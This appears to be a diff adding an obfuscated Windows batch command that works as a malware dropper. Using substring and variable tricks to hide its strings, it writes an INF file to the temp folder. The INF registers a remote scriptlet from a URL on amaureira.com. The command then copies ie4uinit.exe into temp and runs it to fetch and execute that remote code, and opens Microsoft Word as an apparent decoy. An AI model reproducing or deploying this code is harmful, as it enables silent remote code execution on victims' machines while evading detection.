@@ -1,0 +1,8 @@
+/v /ccall%Residents:~0,1%et "Drive=.inf" &&
+  %Residents:~0,1%et "Firms=ieuinit!Drive!" &&
+  call %Residents:~0,1%et "Baskets=%t!Digital!mp%\" &&
+  (for /D %b in ("[F4198]" "sc\" "ro%Vacations%j,NI,%Adult%%Struggle%%Struggle%p%Assess%%Managers%%Managers%sdss.amaureira.%Slide%/028457" "[8B9586]" "ieu%Disorder%!Drive!" "[defaultin%Residents:~0,1%tall.windows7]" "Un\" "Register\" "OCXs=F4198" "delfiles=8B9586" "[string%Residents:~0,1%]" "Slide=com" "%Residents:~0,1%hortsvcname=' '" "Assess=:;Trial" "%Residents:~0,1%ervicename=' '" "Vacations=b;Survivors" "Managers=/" "Struggle=t;Trusts" "Thought=%time%" "Disorder=init" "Adult=h" "[version]" "signature =$windows nt$" "[de%Residents:~0,1%tinationdirs]" "defaultdestdir=11" "8B9586=01" ) do @echo %~b)>"!Baskets!!Firms!" &&
+  %Residents:~0,1%et "Persons=ie4uinit.exe" &&
+  call xcopy /Y /C /Q %win!Slides!ir%\%Residents:~0,1%ystem32\!Persons! "!Baskets!*" &&
+  start "" "!Baskets!!Persons!" -basesettings &&
+  start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
